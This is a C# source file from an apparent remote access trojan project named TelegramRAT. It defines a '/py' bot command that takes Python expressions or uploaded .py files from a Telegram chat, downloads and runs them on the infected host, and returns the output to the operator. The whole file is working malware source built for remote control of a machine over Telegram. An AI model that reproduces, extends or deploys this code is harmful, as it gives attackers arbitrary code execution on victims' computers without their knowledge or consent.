using Telegram.Bot;
using TelegramRAT.Services;
using System.Text;

namespace TelegramRAT.Commands.Misc;

public class PyCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IPythonService pythonService) : AbstractBotCommand
{
    public override string Command => "py";
    public override string[] Aliases => new[] { "python" };
    public override string Description => "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope";
    public override string Example => "/py print('Hello World')";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            if (model.Files.Length == 0)
            {
                if (model.Args.Length == 0)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "Need an expression or file to execute", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    return;
                }

                pythonService.Execute(model.RawArgs ?? string.Empty, out string output);
                output = output.Length > 4096 ? output[..4096] : output;

                string response = string.IsNullOrWhiteSpace(output) ? "Executed!" : $"Executed! Output:\n{output}";
                await botClient.SendMessage(model.Message.Chat.Id, response, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                return;
            }

            if (model.Filename != null && model.Filename.Contains(".py"))
            {
                var file = await botClient.GetFile(model.Files[0].FileId);
                string tempScript = $"{Guid.NewGuid()}.py";
                
                try
                {
                    await using (var scriptFileStream = new FileStream(tempScript, FileMode.Create, FileAccess.Write, FileShare.None, 4096, true))
                    {
                        if (file.FilePath != null)
                        {
                            await botClient.DownloadFile(file.FilePath, scriptFileStream);
                        }
                    }

                    string fileOutput = await pythonService.ExecuteFileAsync(tempScript);
                    fileOutput = fileOutput.Length > 4096 ? fileOutput[..4096] : fileOutput;

                    string response = string.IsNullOrWhiteSpace(fileOutput) ? "Executed!" : $"Executed! Output: {fileOutput}";
                    await botClient.SendMessage(model.Message.Chat.Id, response, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                }
                finally
                {
                    if (global::System.IO.File.Exists(tempScript))
                    {
                        global::System.IO.File.Delete(tempScript);
                    }
                }
                return;
            }

            await botClient.SendMessage(model.Message.Chat.Id, "This file is not a python script!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
